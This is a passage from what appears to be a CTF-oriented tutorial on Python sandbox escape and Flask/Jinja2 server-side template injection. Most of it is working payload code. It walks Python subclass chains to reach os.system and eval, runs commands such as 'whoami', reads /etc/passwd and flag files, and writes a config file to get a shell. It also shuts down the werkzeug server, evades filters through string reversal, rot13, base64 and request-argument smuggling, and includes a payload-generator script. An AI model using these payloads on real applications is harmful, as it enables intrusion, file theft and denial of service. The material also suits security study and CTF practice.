<p>Besides, <code>dir</code> gives a list, and <code>__dict__</code> gives a dict containing values.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lxml</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(lxml)</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__path__&#x27;</span>, <span class="string">&#x27;__version__&#x27;</span>, <span class="string">&#x27;get_include&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxml.__dict__</span><br><span class="line">&#123;<span class="string">&#x27;get_include&#x27;</span>: &lt;function get_include at <span class="number">0x7fb1ad84ad50</span>&gt;, </span><br><span class="line"><span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;bytearray&#x27;</span>: &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, </span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-String-Scanning"><a href="#Bypass-String-Scanning" class="headerlink" title="Bypass String Scanning"></a>Bypass String Scanning</h3><p>Defenders always filter special strings, so we have to change string to bypass.</p>
<p>First we can do python string inversion tricks</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;txt.galf&quot;</span></span><br><span class="line">restr = <span class="built_in">str</span> [::-<span class="number">1</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;r&#x27;</span>,restr)).read()</span><br><span class="line"><span class="comment"># ().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;flag.txt&#x27;)).read()</span></span><br></pre></td></tr></table></figure>
<p>and string concatenation </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;fla&#x27;</span>+<span class="string">&#x27;g.txt&#x27;</span>)).read()</span><br><span class="line"><span class="comment"># ().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;flag.txt&#x27;)).read()</span></span><br></pre></td></tr></table></figure>
<p>if method name is filtered, use <code>__getattribute__()</code> or <code>__getattr__()</code> or <code>getattr()</code>or <code>__dict__</code>, combine with str concat</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;t /home/ctf/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># As for `func_globals`, each func_* will give you surprise</span></span><br></pre></td></tr></table></figure>

<p>Secondly we do characters encoding</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="built_in">getattr</span>(os,codecs.encode(<span class="string">&quot;flfgrz&quot;</span>,<span class="string">&#x27;rot13&#x27;</span>))(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># execute `ifconfig`</span></span><br><span class="line"><span class="comment"># &#x27;getattr&#x27; combine module with its methods/attrs</span></span><br><span class="line"><span class="comment"># &quot;flfgrz&quot; can be decoded as system</span></span><br></pre></td></tr></table></figure>

<p>Base64 is common</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>But what if <code>[</code> and <code>]</code> are filtered? We use <code>__getitem__</code> to replace.<br>It is based on: func[‘attr’] &#x3D;&#x3D;&#x3D; func.attr.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">object</span></span><br></pre></td></tr></table></figure>

<p>What if <code>&#39;</code> and <code>&quot;</code> are also filtered? The solution is not for normal python sandbox, it’s for python web environment.<br>In web framework like <code>flask</code>, use <code>request</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># request.args.xx</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](request.args.s1mple).read()&#125;&#125;&amp;s1mple=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>And what if <code>__</code> is filtered as well? We still use <code>request</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>()[request.args.<span class="keyword">class</span>].bases[<span class="number">0</span>].subclasses()[<span class="number">59</span>].init.<span class="built_in">globals</span>.builtins<span class="string">&#x27;eval&#x27;</span>&amp;<span class="class"><span class="keyword">class</span>=<span class="title">class</span></span></span><br></pre></td></tr></table></figure>

<p>What if <code>{{` and `}}</code> …… ? Use <code>{%if xxxxx}1{% endif %}</code> instead.</p>
<h3 id="Using-Class-Object"><a href="#Using-Class-Object" class="headerlink" title="Using Class Object"></a>Using Class Object</h3><p><code>__mro__</code> method gives a list of parent classes inherited by this.<br>MRO( Method Resolution Order ) indicates that it is associated with inheritance mechanism ( python is multi-inherence ).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1.</span>.__class__.__mro__</span><br><span class="line">(<span class="built_in">float</span>, <span class="built_in">object</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__</span><br><span class="line">(<span class="built_in">str</span>, basestring, <span class="built_in">object</span>)</span><br></pre></td></tr></table></figure>
<p><code>__subclasses__</code> method gives a list of subclasses</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
<p>So we can use <code>__mro__</code> and <code>__subclasses__</code> to get object and useful method. <code>__bases__</code> can also be used, and it is a part of <code>__mro__</code> list.</p>
<p>We have file io payloads down here</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use &#x27;file&#x27; class to read and write</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;&lt;malicious code here&gt;&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">().__class__.__bases__[0].__subclasses__()[40](r&#x27;</span>xxx<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">().__class__.__bases__[0].__subclasses__()[40](&#x27;</span>xxxx<span class="string">&#x27;, &#x27;</span>w<span class="string">&#x27;).write(&#x27;</span>xxx<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
<p>If ssti exists, we can use it to get shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>)</span><br><span class="line">config.from_pyfile(<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>)</span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;/usr/bin/id&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># dos for flash ssti</span></span><br><span class="line">request.environ[<span class="string">&#x27;werkzeug.server.shutdown&#x27;</span>]()</span><br><span class="line"></span><br><span class="line"><span class="comment"># if some string is filtered, split it</span></span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;a=l;b=s;$a$b /var/www/html/&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64 encode</span></span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># that is</span></span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;echo print open(&#x27;</span>/var/www/html/fl4g<span class="string">&#x27;,&#x27;</span><span class="string">r&#x27;).read()&gt;/tmp/get.py</span></span><br><span class="line"><span class="string"># then</span></span><br><span class="line"><span class="string">config[&#x27;</span>RUNCMD<span class="string">&#x27;](&#x27;</span>python /tmp/get.py<span class="string">&#x27;,shell=True)</span></span><br></pre></td></tr></table></figure>
<p>Ways to get shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># identify a class index first</span></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line"><span class="comment"># then use it</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="comment"># site._Printer</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>]._Printer__setup.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="comment"># builtin_function_or_method</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">29</span>].__call__(<span class="built_in">eval</span>,’os.system(“ls”)’)</span><br><span class="line"></span><br><span class="line"><span class="comment"># simple one</span></span><br><span class="line">[].__getattribute__(<span class="string">&#x27;append&#x27;</span>).__class__.__call__(<span class="built_in">eval</span>, <span class="string">&#x27;1+1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># some specials</span></span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;mets&#x27;</span> <span class="string">&#x27;ys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass</span></span><br><span class="line"><span class="comment"># `[` and `]` are banned, use `pop()` instead</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__().pop(<span class="number">71</span>).__init__.__globals__.pop(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;xxx&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="Python3-Sandbox-Escape"><a href="#Python3-Sandbox-Escape" class="headerlink" title="Python3 Sandbox Escape"></a>Python3 Sandbox Escape</h2><h3 id="Builtin-Functions"><a href="#Builtin-Functions" class="headerlink" title="Builtin Functions"></a>Builtin Functions</h3><p><code>__builtin__</code> in python 2.x &#x3D;&#x3D;&gt; <code>builtins</code> in python3.x, and needs import.<br>But finally they all have <code>__builtins__</code>, the reference to builtin modules.</p>
<h3 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h3><p><code>file</code> in python 2.x &#x3D;&gt; <code>open</code> in python 3.x.</p>
<h3 id="Class-Object-Payloads"><a href="#Class-Object-Payloads" class="headerlink" title="Class Object Payloads"></a>Class Object Payloads</h3><p>As python 2.x has different inheritance chain with python 3.x, so we<br>Some payloads in python 3.7</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># still needs to find a class index()</span></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">xxx = [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) </span><br><span class="line"><span class="comment"># then use it</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) </span><br></pre></td></tr></table></figure>
<p><em>Things Change in different</em> <strong>python version</strong> <em>environment</em> <strong>!!!</strong><br>so sometimes it will be like</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>os._wrap_close</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">nnn = [].__class__.__base__.__subclasses__().index(os._wrap_close)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[nnn].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h3><p>Here is a script for generating payloads of <code>ssti</code> in <code>flask</code> using <code>jinja2</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># python 3.5</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask 	<span class="comment"># optional</span></span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template <span class="comment"># optional</span></span><br><span class="line"><span class="comment"># Some of special names</span></span><br><span class="line">searchList = [<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&#x27;__del__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__bytes__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__getattr__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__set__&#x27;</span>, <span class="string">&#x27;__delete__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&quot;__instancecheck__&quot;</span>, <span class="string">&#x27;__subclasscheck__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__length_hint__&#x27;</span>, <span class="string">&#x27;__missing__&#x27;</span>,<span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>,<span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__sub__&#x27;</span>,<span class="string">&#x27;__mul__&#x27;</span>]</span><br><span class="line">neededFunction = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line">pay = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Payload?[1|0]&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(i, attr):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;str(i.&#x27;</span>+attr+<span class="string">&#x27;)[1:9]&#x27;</span>) == <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">eval</span>(<span class="string">&#x27;&quot;&#x27;</span>+goal+<span class="string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):</span><br><span class="line">                        <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                            <span class="built_in">print</span>(i.__name__,<span class="string">&quot;:&quot;</span>, attr, goal)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Another script for detecting modules with <code>os</code>, <code>sys</code> or <code>__builtin__</code> that we can exploit. Effective for python 2.x&#x2F;3.x</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="comment"># &#x27;all_modules_2&#x27; is for python2.x</span></span><br><span class="line"><span class="comment"># &#x27;all_modules_3&#x27; is for python3.x</span></span><br><span class="line">all_modules_2 = [</span><br><span class="line">    <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;CDROM&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;Canvas&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;DLFCN&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;Dialog&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;audioop&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;FileDialog&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;FixTk&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;linuxaudiodev&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;IN&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span 